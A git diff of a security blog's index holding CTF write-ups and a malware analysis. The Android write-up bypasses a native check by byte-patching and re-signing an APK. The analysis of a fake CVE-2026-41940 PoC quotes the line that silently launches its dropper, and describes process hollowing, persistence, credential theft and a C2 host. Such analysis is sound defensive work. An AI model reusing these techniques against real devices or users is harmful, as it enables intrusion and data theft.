+  <div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\refai\Desktop\OXIDIZED INTENTIONS\app<span class="literal">-release</span>\dist&gt; zipalign <span class="literal">-p</span> <span class="operator">-f</span> <span class="literal">-v</span> <span class="number">4</span> .\app<span class="literal">-release</span>.apk aligned.apk</span><br><span class="line">Verifying alignment of aligned.apk (<span class="number">4</span>)...</span><br><span class="line">	<span class="number">50</span> META<span class="literal">-INF</span>/MANIFEST.MF (OK - compressed)</span><br><span class="line">	<span class="number">3343</span> META<span class="literal">-INF</span>/RESEARCH.SF (OK - compressed)</span><br><span class="line">	<span class="number">7084</span> META<span class="literal">-INF</span>/RESEARCH.RSA (OK - compressed)</span><br><span class="line">	<span class="number">8279</span> AndroidManifest.xml (OK - compressed)</span><br><span class="line">	<span class="number">9936</span> classes.dex (OK)</span><br><span class="line"><span class="number">13497788</span> classes2.dex (OK)</span><br><span class="line">.............................</span><br><span class="line">.............................</span><br><span class="line"><span class="number">18380208</span> assets/dexopt/baseline.profm (OK)</span><br><span class="line"><span class="number">18380635</span> DebugProbesKt.bin (OK - compressed)</span><br><span class="line"><span class="number">18381491</span> kotlin<span class="literal">-tooling-metadata</span>.json (OK - compressed)</span><br></pre></td></tr></table></figure></div>
+</li>
+<li><p>Sign the aligned APK with apksigner:</p>
+  <div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\refai\Desktop\OXIDIZED INTENTIONS\app<span class="literal">-release</span>\dist&gt; apksigner sign <span class="literal">--ks</span> .\android.keystore .\aligned.apk</span><br><span class="line">WARNING: A restricted method <span class="keyword">in</span> java.lang.System has been called</span><br><span class="line">WARNING: java.lang.System::loadLibrary has been called by org.conscrypt.NativeLibraryUtil <span class="keyword">in</span> an unnamed module (file:/C:/Users/refai/AppData/Local/Android/Sdk/<span class="built_in">build-tools</span>/<span class="number">36.0</span>.<span class="number">0</span>/lib/apksigner.jar)</span><br><span class="line">WARNING: Use <span class="literal">--enable-native-access</span>=ALL<span class="literal">-UNNAMED</span> to avoid a warning <span class="keyword">for</span> callers <span class="keyword">in</span> this module</span><br><span class="line">WARNING: Restricted methods will be blocked <span class="keyword">in</span> a future release unless native access is enabled</span><br><span class="line"></span><br><span class="line">Keystore password <span class="keyword">for</span> signer <span class="comment">#1: </span></span><br></pre></td></tr></table></figure></div></li>
+</ul>
+</li>
+</ol>
+<p>After patching the APK, reinstall it on the mobile emulator to verify that it no longer displays the fake flag. Use the following command to install the aligned APK:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\refai\Desktop\OXIDIZED INTENTIONS\app-release\dist&gt; adb install .\aligned.apk</span><br><span class="line">Performing Incremental Install</span><br><span class="line">Serving...</span><br><span class="line">All files should be loaded. Notifying the device.</span><br><span class="line">Success</span><br><span class="line">Install command complete in 2289 ms</span><br></pre></td></tr></table></figure></div>
+
+<p>Next, send the correct seed value to trigger the <code>TicketReceiver</code>:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\refai\Desktop\OXIDIZED INTENTIONS\app-release\dist&gt; adb shell am broadcast -n com.example.oxidized_intentions/.TicketReceiver --es seed &quot;fe2o3rust&quot;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="FLAG"><a href="#FLAG" class="headerlink" title="FLAG"></a>FLAG</h2><p>The app now returns the correct flag:</p>
+<p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/img/UOFTCTF-2024/11.webp"
-                      alt="Filter for entry number 36441 showing renamed file" 
-                >
-
-<img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/img/UOFTCTF-2024/12.webp"
-                      alt="Base64 string found inside settings.txt file" 
-                >
-
-<h4 id="6-Extract-and-decode-the-hidden-flag"><a href="#6-Extract-and-decode-the-hidden-flag" class="headerlink" title="6. Extract and decode the hidden flag"></a>6. Extract and decode the hidden flag</h4><p>The <code>settings.txt</code> file contained the following Base64-encoded string:</p>
-<p><code>Ky0tCiB1b2Z0Y3Rme1Q0c0tfU2NoM0R1bDNyX0ZVTn0KKy0t</code></p>
-<p>After decoding the string, the real flag was revealed:</p>
-<p><strong>uoftctf{T4sK_Sch3Dul3r_FUN}</strong></p>
-<hr>
-<h3 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h3><p>By leveraging the NTFS $UsnJrnl journal and Eric Zimmerman’s forensic tools, I was able to efficiently track recent file changes and uncover the attacker’s true flag hidden in a renamed settings file. This challenge highlights the power of NTFS journaling in forensic investigations to track file system events even without active monitoring agents.</p>
-<hr>
+                     data-src="/images/img/OXIDIZED_INTENTIONS_thefewchosen-2025/9.png"
+                     
+                ></p>
+<p>This confirms that patching the HACKER variable successfully bypassed the security check, allowing the correct seed to produce the real flag.</p>
+<p><strong>FLAG</strong>: <strong><code>TFCCTF&#123;167e3ce3c65387c6e981c31c39ac7839&#125;</code></strong></p>
 ]]></content>
       <categories>
         <category>CTF</category>
-        <category>Digital Forensics</category>
+        <category>Mobile</category>
+        <category>Reverse</category>
       </categories>
       <tags>
-        <tag>Forensics</tag>
-        <tag>EricZimmerman</tag>
-        <tag>NTFS</tag>
+        <tag>Mobile</tag>
+        <tag>Android</tag>
+        <tag>apktools</tag>
+        <tag>ida</tag>
+        <tag>Reverse</tag>
       </tags>
   </entry>
   <entry>
@@ -472,155 +624,173 @@
       </tags>
   </entry>
   <entry>
-    <title>OXIDIZED INTENTIONS (TFCCTF-2025)</title>
-    <url>/2025/09/03/OXIDIZED%20INTENTIONS%20(TFCCTF-2025)/</url>
-    <content><![CDATA[<h1 id="Descriptions"><a href="#Descriptions" class="headerlink" title="Descriptions"></a>Descriptions</h1><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Can you find what lays behind this simple game ?</span><br></pre></td></tr></table></figure></div>
+    <title>Poisoned PoC (Fake CVE-2026-41940 Exploit)</title>
+    <url>/2026/10/28/Poisoned-PoC%20(Fake%20CVE-2026-41940%20Exploit)/</url>
+    <content><![CDATA[<h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>When a new CVE drops, most of us do the same thing: open GitHub and search for a PoC. I did that for <strong>CVE-2026-41940</strong> and found a repo that looked legit: a README, a Python script and usage instructions.</p>
+<p>It wasn’t an exploit. It was malware that steals your passwords and lets the attacker watch your screen live. So I took it apart, and here’s what I found.</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Repo : github.com/sakidekin/CVE-2026-41940-PoC</span><br><span class="line">C2   : 194.102.104.223</span><br></pre></td></tr></table></figure></div>
 
-<p>Attachments: </p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/Poisoned-PoC-2026/1.png"
+                     
+                ></p>
+<h2 id="The-short-version"><a href="#The-short-version" class="headerlink" title="The short version"></a>The short version</h2><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python cve.py</span><br><span class="line">   └─► exp.py          (started silently in the background)</span><br><span class="line">         └─► map.py    (copied to AppData + Run key = starts every logon)</span><br><span class="line">               └─► Stage 1 &quot;Lold&quot; loader   (runs from memory, no .exe on disk)</span><br><span class="line">                     └─► Stage 2 &quot;Hermes&quot;  (hidden inside python.exe)</span><br><span class="line">                           ├─ steals passwords, cookies, Discord, Telegram, KeePass, wallets</span><br><span class="line">                           └─ streams your screen to the attacker</span><br></pre></td></tr></table></figure></div>
+
+
+<h2 id="Step-1-One-line-in-cve-py"><a href="#Step-1-One-line-in-cve-py" class="headerlink" title="Step 1: One line in cve.py"></a>Step 1: One line in <code>cve.py</code></h2><p>The “exploit” file looks normal, but <strong>line 11</strong> does this:</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line">subprocess.Popen([sys.executable, <span class="string">&quot;exp.py&quot;</span>])</span><br></pre></td></tr></table></figure></div>
+
+<p>It starts <code>exp.py</code> in the background and doesn’t wait for it. So <code>cve.py</code> keeps printing normal-looking output while the real payload runs. It doesn’t even matter what arguments you give it. <code>python cve.py --help</code> is enough.</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/img/Poisoned-PoC-2026/2.png"
+                     
+                ></p>
+<h2 id="Step-2-exp-py-the-dropper"><a href="#Step-2-exp-py-the-dropper" class="headerlink" title="Step 2: exp.py, the dropper"></a>Step 2: <code>exp.py</code>, the dropper</h2><p><code>exp.py</code> is <strong>1.1 MB</strong>, and almost all of it is one huge encoded blob. That alone should make you stop. A PoC for a web bug doesn’t need a megabyte of encoded data.</p>
+<p>When it runs, it:</p>
 <ul>
-<li>app-release.apk</li>
+<li>copies itself to <code>%LOCALAPPDATA%\map\map.py</code></li>
+<li>adds a Run key named <code>map</code> so it starts every time you log in</li>
+<li>decodes a Windows EXE from the blob and runs it <strong>straight from memory</strong>, so antivirus has no file to scan</li>
 </ul>
-<h2 id="Challenge-Overview"><a href="#Challenge-Overview" class="headerlink" title="Challenge Overview:"></a>Challenge Overview:</h2><p>The Android application is built with a native library for ARM processors and is written in <strong>Kotlin</strong>, so you need to run it on an <strong><code>arm64-v8a</code></strong> environment to execute the app properly. From there, you can interact with the application and analyze how it actually works.</p>
-<p>So, I ended up running the application on my personal phone because I couldn’t find an ARM emulator in Android Studio 😅.</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/img/OXIDIZED_INTENTIONS_TFCCTF-2025/1.png"
+                     data-src="/images/img/Poisoned-PoC-2026/3.png"
                      
                 ></p>
+<h2 id="Step-3-“Lold”-the-loader"><a href="#Step-3-“Lold”-the-loader" class="headerlink" title="Step 3: “Lold”, the loader"></a>Step 3: “Lold”, the loader</h2><p>The decoded EXE keeps its config in plain text inside a PE section called <strong><code>.loldcfg</code></strong>, which made it easy to read.</p>
 <p><img  
                      lazyload
                      src="/images/loading.svg"
-                     data-src="/images/img/OXIDIZED_INTENTIONS_TFCCTF-2025/2.png"
+                     data-src="/images/img/Poisoned-PoC-2026/4.png"
                      
                 ></p>
-<p>Basically, the app is a simple game with a <strong>score</strong> system and <strong>3 lives</strong>. When digging into the APK, I noticed two important things:</p>
-<ol>
-<li><p>The app loads a native library:<br> <code>arm64-v8a/liboxi.so</code></p>
-</li>
-<li><p>In the <strong><code>AndroidManifest.xml</code></strong>, there is an <strong>exported broadcast receiver</strong> that we can abuse:</p>
- <div class="highlight-container" data-rel="Xml"><figure class="iseeu highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">receiver</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.oxidized_intentions.TicketReceiver&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.example.oxidized_intentions.TICKET&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">receiver</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p> Because <code>android:exported=&quot;true&quot;</code> is set, this means any external app (or even <code>adb</code>) can send an intent with the action <strong><code>com.example.oxidized_intentions.TICKET</code></strong> and trigger the receiver.</p>
-</li>
-</ol>
-<h2 id="Source-Code-Analysis"><a href="#Source-Code-Analysis" class="headerlink" title="Source Code Analysis"></a>Source Code Analysis</h2><p>Looking into the decompiled source, we see the following relevant pieces:</p>
-<p><strong>Native class</strong></p>
-<div class="highlight-container" data-rel="Kotlin"><figure class="iseeu highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">Native</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> static <span class="keyword">final</span> Native INSTANCE = new Native();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@JvmStatic</span></span><br><span class="line">    <span class="keyword">public</span> static <span class="keyword">final</span> native String getFlag(Context context, String str, String str2, int i);</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">&quot;oxi&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>This shows that the actual <strong>flag generation logic is hidden inside the native library <code>liboxi.so</code></strong> via the function <code>getFlag(...)</code>.</p>
-<div class="highlight-container" data-rel="Kotlin"><figure class="iseeu highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="title">extends</span> <span class="title">ComponentActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void onCreate(Bundle bundle) &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContent &#123; <span class="comment">/* Compose UI code */</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>MainActivity</strong></p>
-<div class="highlight-container" data-rel="Kotlin"><figure class="iseeu highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="title">extends</span> <span class="title">ComponentActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> void onCreate(Bundle bundle) &#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(bundle);</span><br><span class="line">        setContent &#123; <span class="comment">/* Compose UI code */</span> &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>Nothing too interesting here</p>
-<p><strong>TicketReceiver</strong></p>
-<div class="highlight-container" data-rel="Kotlin"><figure class="iseeu highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> void onReceive(Context context, Intent intent) &#123;</span><br><span class="line">    String stringExtra = intent.getStringExtra(<span class="string">&quot;seed&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (stringExtra == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Log.d(<span class="string">&quot;OXI&quot;</span>, <span class="string">&quot;Got broadcast, seed=&quot;</span> + stringExtra);</span><br><span class="line"></span><br><span class="line">    int i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (int i2 = <span class="number">0</span>; i2 &lt; stringExtra.length(); i2++) &#123;</span><br><span class="line">        i ^= stringExtra.charAt(i2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String flag = Native.getFlag(context, stringExtra, PART_J, i &amp; <span class="number">255</span>);</span><br><span class="line"></span><br><span class="line">    Toast.makeText(context, flag, <span class="number">1</span>).show();</span><br><span class="line">    Log.d(<span class="string">&quot;OXI&quot;</span>, <span class="string">&quot;FLAG=&quot;</span> + flag);</span><br><span class="line"></span><br><span class="line">    Intent intent2 = new Intent(ACTION_FLAGGED);</span><br><span class="line">    intent2.setPackage(context.getPackageName());</span><br><span class="line">    intent2.putExtra(EXTRA_FLAG, flag);</span><br><span class="line">    context.sendBroadcast(intent2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
-
-<p>Here’s what happens inside the <strong><code>TicketReceiver</code></strong>:</p>
-<ol>
-<li><p>It extracts the string extra <code>&quot;seed&quot;</code> from the broadcast intent.</p>
-</li>
-<li><p>If it’s missing, it returns immediately.</p>
-</li>
-<li><p>It logs the seed and computes an integer <code>i</code> by XOR’ing all the characters in the seed.</p>
-</li>
-<li><p>It then calls <code>Native.getFlag(context, seed, PART_J, i &amp; 255)</code> to generate the flag.</p>
-</li>
-<li><p>The flag is shown in a <strong>Toast</strong> and logged.</p>
-</li>
-<li><p>Finally, it broadcasts the flag inside the app.</p>
-</li>
-</ol>
-<h2 id="Solution"><a href="#Solution" class="headerlink" title="Solution"></a>Solution</h2><h3 id="Finding-the-correct-seed"><a href="#Finding-the-correct-seed" class="headerlink" title="Finding  the correct seed"></a>Finding  the correct seed</h3><p>By sending a broadcast with the correct <strong><code>seed</code></strong> value, we can trigger <code>TicketReceiver</code>, which calls into the native library to compute and reveal the flag.</p>
-<p>So now, let’s perform a <strong>static analysis</strong> of the <strong><code>liboxi.so</code></strong> library to figure out how we can determine the correct <strong><code>seed</code></strong>.</p>
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/img/OXIDIZED_INTENTIONS_TFCCTF-2025/4.png"
-                     
-                ></p>
-<p>Inside the function <strong><code>sub_11A4C</code></strong>, we can see a comparison being made against a hardcoded string located in the <strong><code>.rodata</code></strong> section. If the comparison fails, the code returns <code>FAKE&#123;wrong_seed&#125;</code>, otherwise the execution continues and eventually generates the flag.</p>
-<p>Next, we need to send the correct seed value to the <code>TicketReceiver</code> using the following command:</p>
-<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">adb shell am broadcast -n com.example.oxidized_intentions/.TicketReceiver --es seed <span class="string">&quot;fe2o3rust&quot;</span></span><br></pre></td></tr></table></figure></div>
-
-<p><img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/img/OXIDIZED_INTENTIONS_TFCCTF-2025/5.png"
-                     
-                ></p>
-<p>Oops! <strong><code>FAKE&#123;2152411021524119&#125;</code></strong> – that’s a fake flag. What went wrong?</p>
-<h3 id="Patching-the-HACKER-Check"><a href="#Patching-the-HACKER-Check" class="headerlink" title="Patching the HACKER Check"></a>Patching the HACKER Check</h3><p>After digging deeper into <strong><code>liboxi.so</code></strong>, I discovered that inside the function <strong><code>sub_11A4C</code></strong> there’s an additional security check: the variable <strong><code>HACKER</code></strong> must be set to <strong><code>HACKER = 1</code></strong>. I realized I could simply patch it to bypass the restriction.</p>
-<ol>
-<li><p>Decompile the APK using Apktool :</p>
- <div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\refai\Desktop\OXIDIZED INTENTIONS&gt; apktool d .\app<span class="literal">-release</span>.apk</span><br><span class="line">I: <span class="keyword">Using</span> Apktool 2.10.0 on app-release.apk with 4 thread(s).</span><br><span class="line">I: Baksmaling classes.dex...</span><br><span class="line">I: Baksmaling classes2.dex...</span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding file<span class="literal">-resources</span>...</span><br><span class="line">I: Loading resource table from file: C:\Users\refai\AppData\Local\apktool\framework\<span class="number">1</span>.apk</span><br><span class="line">I: Decoding values */* XMLs...</span><br><span class="line">I: Decoding AndroidManifest.xml with resources...</span><br><span class="line">I: Regular manifest package...</span><br><span class="line">I: Copying assets and libs...</span><br><span class="line">I: Copying unknown files...</span><br><span class="line">I: Copying original files...</span><br><span class="line">I: Copying META<span class="literal">-INF</span>/services directory</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p>Analyze <code>liboxi.so</code><br> Open <code>liboxi.so</code> using <strong>Ghidra</strong> or <strong>IntelliJ IDEA</strong> from the path <code>app-release\lib\arm64-v8a</code></p>
-</li>
-<li><p>Patch the security check<br> I modified the bytes from:</p>
- <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">E1 07 00 54 AA 64 84 D2 E8 A7 43 A9 4A 84 B0 F2</span><br></pre></td></tr></table></figure></div>
-<p> to:</p>
- <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">E0 07 00 54 AA 64 84 D2 E8 A7 43 A9 4A 84 B0 F2</span><br></pre></td></tr></table></figure></div>
-<p> this changes the instruction from:</p>
- <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">B.EQ loc_11EDC   ; E1 07 00 54 AA 64 84 D2 E8 A7 43 A9 4A 84 B0 F2</span><br></pre></td></tr></table></figure></div>
-<p> to:</p>
- <div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">B.NE loc_11EDC   ; E0 07 00 54 AA 64 84 D2 E8 A7 43 A9 4A 84 B0 F2</span><br></pre></td></tr></table></figure></div>
-<p> <img  
-                     lazyload
-                     src="/images/loading.svg"
-                     data-src="/images/img/OXIDIZED_INTENTIONS_TFCCTF-2025/8.png"
-                     
-                ></p>
-</li>
-<li><p>Rebuild and sign the APK</p>
+<p>What it does:</p>
 <ul>
-<li><p>Rebuild the patched APK using Apktool:</p>
-  <div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\refai\Desktop\OXIDIZED INTENTIONS\app<span class="literal">-release</span>&gt; apktool b .</span><br><span class="line">I: <span class="keyword">Using</span> Apktool 2.10.0 with 4 thread(s).</span><br><span class="line">I: Checking whether sources has changed...</span><br><span class="line">I: Smaling smali folder into classes.dex...</span><br><span class="line">I: Checking whether sources has changed...</span><br><span class="line">I: Smaling smali_classes2 folder into classes2.dex...</span><br><span class="line">I: Checking whether resources has changed...</span><br><span class="line">I: Building resources...</span><br><span class="line">I: Copying libs... (/lib)</span><br><span class="line">I: Copying libs... (/kotlin)</span><br><span class="line">I: Copying libs... (/META<span class="literal">-INF</span>/services)</span><br><span class="line">I: Building apk file...</span><br><span class="line">I: Copying unknown files/<span class="built_in">dir</span>...</span><br><span class="line">I: Built apk into: .\dist\app<span class="literal">-release</span>.apk</span><br></pre></td></tr></table></figure></div></li>
-<li><p>Generate a self-signed certificate and sign the APK:</p>
-  <div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\refai\Desktop\OXIDIZED INTENTIONS\app<span class="literal">-release</span>\dist&gt; keytool <span class="literal">-genkeypair</span> <span class="literal">-v</span> <span class="literal">-keystore</span> android.keystore <span class="literal">-alias</span> research_key <span class="literal">-keyalg</span> RSA <span class="literal">-keysize</span> <span class="number">2048</span> <span class="literal">-validity</span> <span class="number">10000</span></span><br><span class="line">Enter keystore password:  </span><br><span class="line">Re<span class="literal">-enter</span> new password: </span><br><span class="line">Enter the distinguished name. Provide a single dot (.) to leave a sub<span class="literal">-component</span> empty or press ENTER to use the default value <span class="keyword">in</span> braces.</span><br><span class="line">What is your first and last name?</span><br><span class="line">What is the name of your organizational unit?</span><br><span class="line">What is the name of your organization?</span><br><span class="line">What is the name of your City or Locality?</span><br><span class="line">What is the name of your State or Province?</span><br><span class="line">What is the two<span class="literal">-letter</span> country code <span class="keyword">for</span> this unit?</span><br><span class="line">Is CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown correct?</span><br><span class="line">[<span class="type">no</span>]:  yes</span><br><span class="line">Generating <span class="number">2048</span><span class="literal">-bit</span> RSA key pair and self<span class="literal">-signed</span> certificate (SHA384withRSA) with a validity of <span class="number">10</span>,<span class="number">000</span> days</span><br><span class="line">		<span class="keyword">for</span>: CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown</span><br><span class="line">[<span class="type">Storing</span> <span class="type">android.keystore</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
-
-  <div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\refai\Desktop\OXIDIZED INTENTIONS\app<span class="literal">-release</span>\dist&gt; jarsigner <span class="literal">-verbose</span> <span class="literal">-sigalg</span> SHA1withRSA <span class="literal">-digestalg</span> SHA1 <span class="literal">-keystore</span> android.keystore .\app<span class="literal">-release</span>.apk research_key</span><br><span class="line">Enter Passphrase <span class="keyword">for</span> keystore: </span><br><span class="line">adding: META<span class="literal">-INF</span>/MANIFEST.MF</span><br><span class="line">adding: META<span class="literal">-INF</span>/RESEARCH.SF</span><br><span class="line">adding: META<span class="literal">-INF</span>/RESEARCH.RSA</span><br><span class="line">signing: AndroidManifest.xml</span><br><span class="line">signing: classes.dex</span><br><span class="line">signing: classes2.dex</span><br><span class="line">signing: kotlin/annotation/annotation.kotlin_builtins</span><br><span class="line">.................</span><br><span class="line">.................</span><br><span class="line">.................</span><br><span class="line">&gt;&gt;&gt; Signer</span><br><span class="line">	X.<span class="number">509</span>, CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown</span><br><span class="line">	Signature algorithm: SHA384withRSA, <span class="number">2048</span><span class="literal">-bit</span> RSA key</span><br><span class="line">	[<span class="type">trusted</span> <span class="type">certificate</span>]</span><br><span class="line"></span><br><span class="line">jar signed.</span><br><span class="line"></span><br><span class="line">Warning:</span><br><span class="line">The signer<span class="string">&#x27;s certificate is self-signed.</span></span><br><span class="line"><span class="string">The SHA1 algorithm specified for the -digestalg option is considered a security risk and is disabled.</span></span><br><span class="line"><span class="string">The SHA1withRSA algorithm specified for the -sigalg option is considered a security risk and is disabled.</span></span><br></pre></td></tr></table></figure></div></li>
+<li>talks to its C2 at <code>194.102.104.223:8093</code></li>
+<li>starts a real <code>python3.13.exe --lold-container</code>, empties it, and puts the next stage inside it (<strong>process hollowing</strong>). In Task Manager it just looks like Python.</li>
+<li>has backup persistence ready (WMI events, COM hijack, fake <code>OneDriveUpdate.exe</code> &#x2F; <code>SyncService.exe</code> files) in case you delete the Run key</li>
 </ul>
-</li>
-<li><p>Optimize and Finalize the APK</p>
-<ul>
-<li><p>Align the APK using zipalign:</p>
-  <div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\refai\Desktop\OXIDIZED INTENTIONS\app<span class="literal">-release</span>\dist&gt; zipalign <span class="literal">-p</span> <span class="operator">-f</span> <span class="literal">-v</span> <span class="number">4</span> .\app<span class="literal">-release</span>.apk aligned.apk</span><br><span class="line">Verifying alignment of aligned.apk (<span class="number">4</span>)...</span><br><span class="line">	<span class="number">50</span> META<span class="literal">-INF</span>/MANIFEST.MF (OK - compressed)</span><br><span class="line">	<span class="number">3343</span> META<span class="literal">-INF</span>/RESEARCH.SF (OK - compressed)</span><br><span class="line">	<span class="number">7084</span> META<span class="literal">-INF</span>/RESEARCH.RSA (OK - compressed)</span><br><span class="line">	<span class="number">8279</span> AndroidManifest.xml (OK - compressed)</span><br><span class="line">	<span class="number">9936</span> classes.dex (OK)</span><br><span class="line"><span class="number">13497788</span> classes2.dex (OK)</span><br><span class="line">.............................</span><br><span class="line">.............................</span><br><span class="line"><span class="number">18380208</span> assets/dexopt/baseline.profm (OK)</span><br><span class="line"><span class="number">18380635</span> DebugProbesKt.bin (OK - compressed)</span><br><span class="line"><span class="number">18381491</span> kotlin<span class="literal">-tooling-metadata</span>.json (OK - compressed)</span><br></pre></td></tr></table></figure></div>
-</li>
-<li><p>Sign the aligned APK with apksigner:</p>
-  <div class="highlight-container" data-rel="Powershell"><figure class="iseeu highlight powershell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">PS</span> C:\Users\refai\Desktop\OXIDIZED INTENTIONS\app<span class="literal">-release</span>\dist&gt; apksigner sign <span class="literal">--ks</span> .\android.keystore .\aligned.apk</span><br><span class="line">WARNING: A restricted method <span class="keyword">in</span> java.lang.System has been called</span><br><span class="line">WARNING: java.lang.System::loadLibrary has been called by org.conscrypt.NativeLibraryUtil <span class="keyword">in</span> an unnamed module (file:/C:/Users/refai/AppData/Local/Android/Sdk/<span class="built_in">build-tools</span>/<span class="number">36.0</span>.<span class="number">0</span>/lib/apksigner.jar)</span><br><span class="line">WARNING: Use <span class="literal">--enable-native-access</span>=ALL<span class="literal">-UNNAMED</span> to avoid a warning <span class="keyword">for</span> callers <span class="keyword">in</span> this module</span><br><span class="line">WARNING: Restricted methods will be blocked <span class="keyword">in</span> a future release unless native access is enabled</span><br><span class="line"></span><br><span class="line">Keystore password <span class="keyword">for</span> signer <span class="comment">#1: </span></span><br></pre></td></tr></table></figure></div></li>
-</ul>
-</li>
-</ol>
-<p>After patching the APK, reinstall it on the mobile emulator to verify that it no longer displays the fake flag. Use the following command to install the aligned APK:</p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\refai\Desktop\OXIDIZED INTENTIONS\app-release\dist&gt; adb install .\aligned.apk</span><br><span class="line">Performing Incremental Install</span><br><span class="line">Serving...</span><br><span class="line">All files should be loaded. Notifying the device.</span><br><span class="line">Success</span><br><span class="line">Install command complete in 2289 ms</span><br></pre></td></tr></table></figure></div>
-
-<p>Next, send the correct seed value to trigger the <code>TicketReceiver</code>:</p>
